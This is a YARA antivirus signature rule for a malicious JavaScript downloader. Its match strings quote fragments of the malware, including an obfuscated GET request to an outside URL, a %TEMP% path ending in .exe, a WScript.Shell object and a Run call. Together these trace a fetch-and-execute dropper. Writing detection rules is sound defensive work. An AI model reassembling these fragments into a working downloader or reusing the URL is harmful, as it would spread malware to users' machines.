rule sig_20160401_8e50f2ab04c56420f069ecb4bf7b4bcc {
  meta:
    description = "datamaliciousorder - file 20160401_8e50f2ab04c56420f069ecb4bf7b4bcc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7ae2386abd0508a6e293b1d02115c615d9ab7a17041d220a2a05dcc223ebee09"

  strings:
    $s1  = "DaBu[UkAvc](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function PjmXi(SooEg, LxDo){AuuBd = AuuBd * 1; return SooEg - LxDo;};" fullword ascii
    $s3  = "if (DaBu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function LxMn() {return BpDmd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hxPnkwQtoq.ex\" + \"e\";};" fullword ascii
    $s5  = "var BpDmd = function CaVgq() {return WScript[HtOn](\"WScript\"+\".Shell\");}(), KePyh = 11;" fullword ascii
    $s6  = "function WsjEwt(){return PcQdy + \"\";};" fullword ascii
    $s7  = "function XuhVrw() {return ((XtKun == true) && (XtKun == RqIly)) ? 1 : AuuBd;};" fullword ascii
    $s8  = "function QgTzf(){return HtOn;};" fullword ascii
    $s9  = "return PjmXi(PwWgr, ApZry);" fullword ascii
    $s10 = "function AusGz(){return 23;};" fullword ascii
    $s11 = "function YpzVqc(EcIc) {var DyBu = (1, 2, 3, 4, 5, EcIc); return DyBu;};" fullword ascii
    $s12 = "RqIly = true; " fullword ascii
    $s13 = "var RqIly = false;" fullword ascii
    $s14 = "function QzFj(IdnSbb){BpDmd[\"R\"+\"un\"](IdnSbb, AuuBd, AuuBd);};" fullword ascii
    $s15 = "}while (CbCt);" fullword ascii
    $s16 = "var XtKun = false;" fullword ascii
    $s17 = "XtKun = true; " fullword ascii
    $s18 = "var SnPl = false;" fullword ascii
    $s19 = "function PnHna()" fullword ascii
    $s20 = "var FqbPbf = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}